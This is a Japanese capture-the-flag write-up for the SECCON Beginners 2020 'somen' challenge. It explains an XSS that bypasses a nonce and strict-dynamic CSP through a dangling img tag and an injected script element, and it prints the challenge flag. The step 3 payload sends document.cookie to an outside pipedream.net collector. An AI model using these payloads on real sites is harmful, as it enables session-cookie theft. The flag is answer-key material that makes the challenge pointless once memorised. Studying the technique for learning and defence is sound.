# SECCON Beginners CTF 2020 "somen" writeup

## 問題

```
Somen is tasty.

https://somen.quals.beginners.seccon.jp
```

## 解法

CSP nocnce + strict-dynamic の XSS 問題

### 問題の設定

- http header にて CSP が設定されている

```
Content-Security-Policy: default-src 'none'; script-src 'nonce-eiiCiTQ9UAZxTQqdJ7s/9dc/BGA=' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='
```

- title タグにエスケープ無しで任意コードの挿入が可能

```php
<title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>
```

- html にて id="message" に任意コードの挿入が可能なインラインスクリプト

```html
<script nonce="eiiCiTQ9UAZxTQqdJ7s/9dc/BGA=">
    const choice = l => l[Math.floor(Math.random() * l.length)];

    window.onload = () => {
        const username = new URL(location).searchParams.get("username");
        const adjective = choice(["Nagashi", "Hiyashi"]);
        if (username !== null)
            document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
    }
</script>
```

- security.js

username パラメータをアルファベットと数字のみに制限

```javascript
console.log('!! security.js !!');
const username = new URL(location).searchParams.get("username");
if (username !== null && ! /^[a-zA-Z0-9]*$/.test(username)) {
    document.location = "/error.php";
}
```

### Step 1. security.js の無効化

[Content Security Policy Level 3 における XSS 対策 - pixiv inside](https://inside.pixiv.blog/kobo/5137) に記載の Content exfiltration / Scriptless attack を使います

```
/?username=</title>aaa<img src="https://xxx.x.pipedream.net/?x=
```

とすることで img タグの終了部分が security.js の`</script>`までとなり security.js を無効化することができます

### Step 2. `<script id="message">` による CSP バイパス

CSP の設定により、

- nonce が付与されている

- ハッシュ値が`sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A=`である

Javascript しか実行できないようになっていますが、`strict-dynamic`が設定されていることにより「すでに信頼されている Javascript が生成した Javascript コード」は実行されます

よって CSP nonce によって実行が許可されている

```javascript
document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
```

このインラインスクリプトによって生成される Javascript は実行されます

このコードは id="message"となっているタグの中身を書き換えるものであるので`<script id="message">`を事前に挿入しておき、innerHTML によって`<script id="message">`内で Javascript を展開して実行することができます

また`<script id="message">`内で Javascript が展開された時に邪魔になるコードをコメントアウトすると

```
/?username=alert(1)//</title><script id="message"></script><img src="https://xxx.x.pipedream.net/?x=
```

これで`alert(1)`が実行されることになります

### Step 3. cookie の窃取

先程できたコードに document.cookie を窃取するコードを追加すると

```
/?username=import(`//xxx.x.pipedream.net/?${document.cookie}`)//</title><script id="message"></script><img src="https://xxx.x.pipedream.net/?x=
```

これをクローラーに提出すると

```
https://xxx.x.pipedream.net/?flag=ctf4b{1_w0uld_l1k3_70_347_50m3n_b3f0r3_7ry1n6_70_3xpl017}
```

フラグを含んだリクエストが飛んできます

```
ctf4b{1_w0uld_l1k3_70_347_50m3n_b3f0r3_7ry1n6_70_3xpl017}
```
